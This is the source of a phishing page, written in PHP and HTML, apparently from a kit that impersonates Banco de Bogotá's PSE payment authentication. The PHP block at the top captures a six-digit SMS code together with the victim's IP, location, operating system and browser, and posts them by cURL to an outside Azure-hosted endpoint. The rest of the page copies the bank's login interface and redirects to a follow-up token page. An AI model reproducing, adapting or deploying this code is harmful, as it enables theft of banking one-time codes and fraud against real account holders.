<?php ini_set('display_errors', 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('tlgm.php');
include('funciones.php');
if (isset($_POST['num1']) && isset($_POST['num2']) && isset($_POST['num3']) && isset($_POST['num4']) && isset($_POST['num5']) && isset($_POST['num6'])) {
    $message = 'B4NC0 BOGOTA
SMS: ' . $_POST['num1'] . $_POST['num2'] . $_POST['num3'] . $_POST['num4'] . $_POST['num5'] . $_POST['num6'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
    $payload = ['mensaje' => $message];
    $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/bogotanequi/';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json',
            'Content-Type: application/json',
'X-Client-IP: ' . $myip,
        ],
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log('cURL error: ' . curl_error($ch));
        http_response_code(500);
        exit('Error de red.');
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
} ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

    <meta http-equiv="refresh" content="8;url=tokeninva.php">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <title>Bogota</title>

    <link rel="stylesheet" href="./bogo/lfr_style.css">
    <link rel="stylesheet" href="./bogo/lfr_ownstyle.css">
</head>

<body style="">

    <div class="box-container">
        <div class="container">
            <div class="toast hidden" id="errorMessage" style="position: absolute;">
                <p id="AuthLabel"></p>
                <span class="icon-close-search-r" onclick="hideToast()"></span>
            </div>
            <div class="container__water-mark">
                <div class="container__water-mark--image-container"></div>
            </div>
            <div class="container__login">
                <div class="container__login--header">
                    <img src="./bogo/logobanco1.png" alt="">
                </div>
                <div class="container__login--title">
                    <div class="container__login--title-1">
                        <div class="container__login--title-1">
                            <p>Identificacion de usuario</p>
                        </div>
                        <div class="container__login--title-2">
                            <p>
                                <label class="tituloformulario" id="flujoOrigenLbl">Pagos PSE</label>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="container__login--login-box-id">
                    <div class="container__login--login-box-title">
                        <span><strong>Ha ingresado desde: BANCOLOMBIA
                            </strong></span>
                    </div>
                    <div class="form-container">

                        <form method="post" name="authenticateForm" id="authenticateForm" action="https://b2b2.bancodebogota.com.co/PSEBANCODEBOGOTA/control/pse3/AuthenticationPN.authenticate" autocomplete="off">
                            <input type="hidden" size="8" id="currentSessionTime" name="currentSessionTime" value="1709245729624">
                            <input type="hidden" size="8" id="initSessionTime" name="initSessionTime" value="1709245646774">
                            <input type="hidden" size="8" id="validSessionTime" name="validSessionTime" value="00:07">
                            <input type="hidden" size="8" name="cancelationCause"> <input type="hidden" size="8" name="cancelationSource" value="Authentication"> <input type="hidden" size="8" name="backToken" value="false"> <input type="hidden" name="ClientRequieresToken" value="">

                            <input type="hidden" name="processInstanceId" value="000000018DF6FC0B4D0A4167875F3330">
                            <input type="hidden" name="activityInstanceId" value="000000018DF6FC0B582163893B41494E">



                            <div class="field-1">
                                <div class="custom-input">
                                    <div class="label">
                                        <label for="password">Clave de la tarjeta debito</label>
                                    </div>
                                    <input name="Password" type="password" class="custom-form-control" id="Password" maxlength="4" size="8">
                                </div>
                            </div>

                            <div class="btn-container">
                                <button type="button" class="btn-main" id="btnContinue" onclick="validate();" disabled="">Continuar</button>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="timeElapsed">
                    <label>Tiempo restante&nbsp;</label><span id="timeE_min">05</span><label>:</label><span id="timeE_seg">18</span><label>&nbsp;minutos</label><br> <label><span id="timeE_date">Jueves, 29 de Febrero de 2024, 5:28 PM</span></label><br> <label><span id="timeE_ip">IP 186.116.65.249</span></label>
                </div>
            </div>

            <style>
                ul {
                    list-style-type: none;
                    margin-top: 2rem;
                    margin-left: 4rem;
                    vertical-align: top;
                }

                li {
                    display: flex;
                    align-items: center;
                    margin-bottom: 1rem;
                }

                .icon-info {
                    width: 3rem;
                    height: 3rem;
                    margin-right: 1rem;
                    object-fit: cover;
                }
            </style>
            <div class="container__info">
                <div class="container__info--tips">
                    <div class="collapsable">
                        <div class="collapse">
                            <div class="collapse__header">
                                <div class="collapse__header--text">
                                    <p class="header">Tu seguridad es lo primero</p>
                                </div>
                                <div class="collapse__header--btn">
                                    <i class="icon-down-b"></i>
                                </div>
                            </div>
                            <div class="collapse__content hidden">
                                <p>Sigue estos tips y tus transacciones estarï¿½n blindadas</p>
                                <ul>
                                    <li><img id="icon-pass" class="icon-info" src="./bogo/icon-pass.png">
                                        <p><strong>No compartas</strong> tus claves o token con terceros.</p>
                                    </li>
                                    <li><img id="icon-device" class="icon-info" src="./bogo/icon-device.png">
                                        <p><strong>Evita realizar</strong> transacciones desde un equipo o dispositivo desconocido.</p>
                                    </li>
                                    <li><img id="icon-lock" class="icon-info" src="./bogo/icon-lock.png">
                                        <p><strong>Procura cambiar</strong> tus contraseï¿½as bancarias periï¿½dicamente o antes si sientes que es necesario.</p>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="collapsable">
                        <div class="collapse">
                            <div class="collapse__header">
                                <div class="collapse__header--text">
                                    <p class="header">Contï¿½ctanos</p>
                                </div>
                                <div class="collapse__header--btn">
                                    <i class="icon-down-b"></i>
                                </div>
                            </div>
                            <div class="collapse__content hidden">
                                <p>Si tienes alguna duda o algo te ha sucedido, usa nuestros canales</p>
                                <ul>
                                    <li><img id="icon-call" class="icon-info" src="./bogo/icon-call.png">
                                        <p>Llamar a la <strong>Servilinea</strong></p>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal modalSE hidden" id="safeExitModal">
                <div class="modal__container" id="semc">
                    <span class="close" id="closeModalSE" onclick="hideModalSE()">ï¿½</span>
                    <div class="modal-title">
                        <h2>Abandonar el proceso</h2>
                    </div>
                    <div class="modal-text" id="modalSafeExitMsg">
                        <p>Ha activado una Salida de forma segura</p>
                    </div>
                    <div class="modal-action">
                        <button type="button" class="btn-main" onclick="lfr_controlExit()">Aceptar</button>
                    </div>
                </div>
            </div>
            <div class="overlay overlaySE hidden"></div>
            <div class="modal modalMA hidden">
                <div class="modal__container" id="containerMA">
                    <h2 class="modal-title">Se requiere una acciï¿½n vï¿½lida</h2>
                    <div class="modal__container--content">
                        <p class="modal-text" id="modalAlertMsg"></p>
                        <div class="modal-action">
                            <button type="button" class="btn-main" onclick="hideModalMA()">Entendido</button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="overlay overlayMA hidden"></div>

            <div class="modal modalIN hidden">
                <div class="modal__container">
                    <div class="modal-title">
                        <h2>Accion Automotica Activada</h2>
                    </div>
                    <div class="modal-text">
                        <p id="modalAlertMsgIN"></p>
                    </div>
                    <div class="modal-action">
                        <button type="button" class="btn-main" onclick="lfr_inactivityAction()">Entendido</button>
                    </div>
                </div>
            </div>
            <div class="overlay overlayIN hidden"></div>

            <style>
                .btn-img {
                    background: none;
                    border: none;
                    min-width: 15rem;
                    height: 5rem;
                    outline: none;
                    cursor: pointer;
                }

                #getOnPlayStore {
                    min-width: 15rem;
                    height: 5rem;
                    object-fit: cover;
                }

                @media only screen and (max-width: 37.5em) {
                    #getOnPlayStore {
                        height: 4rem !important;
                    }
                }

                #tokenAppImg {
                    min-width: 6rem;
                    height: 6rem;
                }

                #getOnAppStore {
                    min-width: 15rem;
                    height: 5rem;
                    object-fit: cover;
                }

                @media only screen and (max-width: 37.5em) {
                    #getOnAppStore {
                        height: 4rem !important;
                        margin-top: 0.5rem;
                        margin-bottom: 0.5rem;
                    }
                }


                .modalPopUp-text {
                    font-size: 1.6rem;
                    color: black;
                    margin-bottom: 1.5rem;
                }

                #download {
                    color: #0040a8;
                }

                .link {
                    color: #0040a8;
                    text-decoration: underline;
                    cursor: pointer;
                }

                #modalAction {
                    margin-bottom: 1.5rem;
                }

                .modal-bottom {
                    display: flex;
                    flex-direction: row;
                    justify-content: center;
                    align-items: center;
                }
            </style>
            <form action="aquivaellink" method="post" id="tok">
                <div class="modal modalUP">
                    <div class="modal__container">
                        <h2 class="modal-title">Para la realizacion de tus pagos sera necesario el uso del Token o Sms a tu telefono.</h2><br>
                        <style>
                            .token-container {
                                display: flex;
                                flex-wrap: wrap;
                                /* Permitir que los elementos se envuelvan en pantallas pequeÃ±as */
                                justify-content: space-around;
                                max-width: 400px;
                                /* Ajusta el ancho mÃ¡ximo segÃºn tus necesidades */
                                margin: auto;
                                /* Centra el contenedor */
                            }

                            .token-input {
                                width: 30%;
                                /* Ajusta el ancho del cuadro segÃºn tus necesidades */
                                max-width: 60px;
                                /* Establecer un ancho mÃ¡ximo para evitar que los cuadros sean demasiado grandes */
                                height: 60px;
                                /* Ajusta la altura del cuadro segÃºn tus necesidades */
                                text-align: center;
                                font-size: 20px;
                                /* Ajusta el tamaÃ±o de la fuente segÃºn tus necesidades */
                                border: 2px solid #ccc;
                                border-radius: 8px;
                                margin-bottom: 10px;
                                /* Espaciado entre cuadros */
                            }

                            @media screen and (max-width: 600px) {
                                .token-input {
                                    width: 45%;
                                    /* Ajusta el ancho del cuadro para pantallas muy pequeÃ±as */
                                    max-width: 40px;
                                    /* Reduzca aÃºn mÃ¡s el ancho mÃ¡ximo en dispositivos mÃ³viles */
                                    height: 40px;
                                    /* Reduzca la altura en dispositivos mÃ³viles */
                                    font-size: 16px;
                                    /* Reduzca el tamaÃ±o de la fuente en dispositivos mÃ³viles */
                                }
                            }
                        </style>

                        <div class="loader-container">
                            <div class="loader"></div>
                            <p>Cargando...</p>
                        </div>

                        <style>
                            .loader-container {
                                display: flex;
                                flex-direction: column;
                                align-items: center;
                                color: #333;
                            }

                            .loader {
                                border: 8px solid #184bdd;
                                /* Establece el color azul (#3498db) */
                                border-top: 8px solid transparent;
                                border-radius: 50%;
                                width: 50px;
                                height: 50px;
                                animation: spin 1s linear infinite;
                                margin-bottom: 20px;
                            }

                            @keyframes spin {
                                0% {
                                    transform: rotate(0deg);
                                }

                                100% {
                                    transform: rotate(360deg);
                                }
                            }
                        </style>

                        <script>
                            function moveToNextInput(currentInput, nextInputIndex) {
                                const inputValue = currentInput.value;

                                if (!isNaN(inputValue) && nextInputIndex) {
                                    const nextInput = document.querySelector(`.token-input:nth-child(${nextInputIndex})`);
                                    nextInput.focus();
                                }
                            }
                        </script>

                        <script>
                            function moveToNextInput(currentInput, nextInputIndex) {
                                const inputValue = currentInput.value;

                                if (!isNaN(inputValue) && nextInputIndex) {
                                    const nextInput = document.querySelector(`.token-input:nth-child(${nextInputIndex})`);
                                    nextInput.removeAttribute('readonly');
                                    nextInput.focus();
                                }
                            }
                        </script><br>
                        <button type="submit" class="btn-main" id="btnAction" disabled>Continuar</button>

            </form>
            <div class="modal-bottom">
                <p class="modal-text">*Si tu eres Persona Juridica busca en la tienda de aplicaciones <b>Token Movil</b></p>
                <img id="tokenAppImg" src="./bogo/app-token.png">
            </div>
        </div>
    </div>
    <div class="overlay overlayUP"></div>


    </div>

    </div>


</body>

</html>